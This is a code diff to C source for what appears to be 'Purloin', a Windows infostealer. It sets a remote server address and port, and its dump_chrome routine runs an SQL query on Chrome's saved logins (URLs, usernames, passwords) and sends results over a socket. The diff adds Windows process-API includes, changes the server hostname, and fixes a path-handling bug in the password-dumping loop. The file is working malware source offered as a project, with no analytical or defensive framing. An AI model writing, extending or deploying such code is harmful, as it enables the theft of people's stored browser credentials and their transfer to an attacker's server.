@@ -5,10 +5,14 @@
 #include "Purloin/includes/Purloin_Server.h"
 #include "Purloin/includes/Purloin_Chrome.h"
 
+#include <windows.h>
+#include <tchar.h>
+#include <psapi.h>
+
 #define ENC_MASTER_KEY_LEN 357
 #define CIPHER_LEN 512
 #define DEFAULT_BUFLEN 512
-//#define SERVER_IP "purloin2.sytes.net"
+//#define SERVER_IP "purloin.sytes.net"
 #define SERVER_IP "192.168.8.101"
 #define DEFAULT_PORT "25565"
 
@@ -112,6 +116,7 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 			void* handle_sql_stmt = NULL;															// Handle to SQLite Query Statement
 			if (!prepare_sql(handle_db, &handle_sql_stmt, "SELECT origin_url,username_value,password_value FROM logins", message, message_size)) {
 				Debug(send_data(message, ConnectSocket);)
+				memset(chrome_dir_char + lstrlenA(chrome_dir_char) - lstrlenA(dir_files.cFileName) - 12, '\0', lstrlenA(dir_files.cFileName) + 12);
 				continue;
 			}
 
